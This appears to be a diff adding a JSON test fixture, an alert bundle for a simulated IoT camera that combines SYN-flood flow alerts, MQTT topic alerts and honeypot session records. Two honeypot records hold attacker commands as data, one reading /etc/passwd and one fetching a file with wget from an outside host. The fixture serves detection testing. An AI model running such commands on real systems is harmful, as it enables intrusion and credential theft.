@@ -1,0 +1,185 @@
+{
+  "bundle": {
+    "alerts": [
+      {
+        "alert_id": "f1",
+        "detail": {
+          "ack_count_fwd": 0,
+          "bytes_bwd": 0,
+          "bytes_fwd": 720,
+          "dst_ip": "192.0.2.10",
+          "dst_port": 80,
+          "duration_s": 1.5,
+          "flow_start": "2026-01-01T00:00:02Z",
+          "packets_bwd": 0,
+          "packets_fwd": 12,
+          "protocol": "tcp",
+          "src_ip": "10.77.0.22",
+          "src_port": 40002,
+          "syn_count_fwd": 12,
+          "tcp_flags": null
+        },
+        "detector_label": "syn_flood",
+        "detector_name": "flow_classifier",
+        "detector_score": 0.97,
+        "schema_version": "alert-v1",
+        "source": "flows",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:02Z"
+      },
+      {
+        "alert_id": "f2",
+        "detail": {
+          "ack_count_fwd": 0,
+          "bytes_bwd": 0,
+          "bytes_fwd": 720,
+          "dst_ip": "192.0.2.11",
+          "dst_port": 443,
+          "duration_s": 1.5,
+          "flow_start": "2026-01-01T00:00:05Z",
+          "packets_bwd": 0,
+          "packets_fwd": 12,
+          "protocol": "tcp",
+          "src_ip": "10.77.0.22",
+          "src_port": 40005,
+          "syn_count_fwd": 12,
+          "tcp_flags": null
+        },
+        "detector_label": "syn_flood",
+        "detector_name": "flow_classifier",
+        "detector_score": 0.61,
+        "schema_version": "alert-v1",
+        "source": "flows",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:05Z"
+      },
+      {
+        "alert_id": "m1",
+        "detail": {
+          "client_id": null,
+          "dst_ip": null,
+          "dst_port": null,
+          "event": "publish",
+          "payload_bytes": 4,
+          "qos": 0,
+          "src_ip": null,
+          "src_port": null,
+          "topic": "iot/iot-cam-01/flood"
+        },
+        "detector_label": "novel_topic",
+        "detector_name": "mqtt_thresholds",
+        "detector_score": 1.0,
+        "schema_version": "alert-v1",
+        "source": "mqtt",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:03Z"
+      },
+      {
+        "alert_id": "m2",
+        "detail": {
+          "client_id": null,
+          "dst_ip": null,
+          "dst_port": null,
+          "event": "publish",
+          "payload_bytes": 40,
+          "qos": 0,
+          "src_ip": null,
+          "src_port": null,
+          "topic": "iot/iot-cam-01/telemetry"
+        },
+        "detector_label": "novel_topic",
+        "detector_name": "mqtt_thresholds",
+        "detector_score": 0.0,
+        "schema_version": "alert-v1",
+        "source": "mqtt",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:08Z"
+      },
+      {
+        "alert_id": "h1",
+        "detail": {
+          "client_version": null,
+          "command": null,
+          "dst_ip": null,
+          "dst_port": null,
+          "event": "session_connect",
+          "password": null,
+          "protocol": null,
+          "session_id": "s1",
+          "src_ip": "10.77.0.30",
+          "src_port": 22,
+          "username": null
+        },
+        "detector_label": "session_connect",
+        "detector_name": "honeypot_rules",
+        "detector_score": 0.8,
+        "schema_version": "alert-v1",
+        "source": "honeypot",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:01Z"
+      },
+      {
+        "alert_id": "h2",
+        "detail": {
+          "client_version": null,
+          "command": "cat /etc/passwd",
+          "dst_ip": null,
+          "dst_port": null,
+          "event": "command",
+          "password": null,
+          "protocol": null,
+          "session_id": "s1",
+          "src_ip": "10.77.0.30",
+          "src_port": 22,
+          "username": null
+        },
+        "detector_label": "command",
+        "detector_name": "honeypot_rules",
+        "detector_score": 0.8,
+        "schema_version": "alert-v1",
+        "source": "honeypot",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:04Z"
+      },
+      {
+        "alert_id": "h3",
+        "detail": {
+          "client_version": null,
+          "command": "wget http://192.0.2.9/x",
+          "dst_ip": null,
+          "dst_port": null,
+          "event": "command",
+          "password": null,
+          "protocol": null,
+          "session_id": "s1",
+          "src_ip": "10.77.0.30",
+          "src_port": 22,
+          "username": null
+        },
+        "detector_label": "command",
+        "detector_name": "honeypot_rules",
+        "detector_score": 0.8,
+        "schema_version": "alert-v1",
+        "source": "honeypot",
+        "subject_device": "iot-cam-01",
+        "ts": "2026-01-01T00:00:06Z"
+      }
+    ],
+    "bundle_id": "iot-cam-01|2026-01-01T00:00:00+00:00",
+    "device": "iot-cam-01",
+    "episode_id": "ep-golden",
+    "label": "mixed",
+    "sources": [
+      "flows",
+      "honeypot",
+      "mqtt"
+    ],
+    "window_end": "2026-01-01T00:01:00Z",
+    "window_start": "2026-01-01T00:00:00Z"
+  },
+  "sources": [
+    "flows",
+    "mqtt",
+    "honeypot"
+  ]
+}
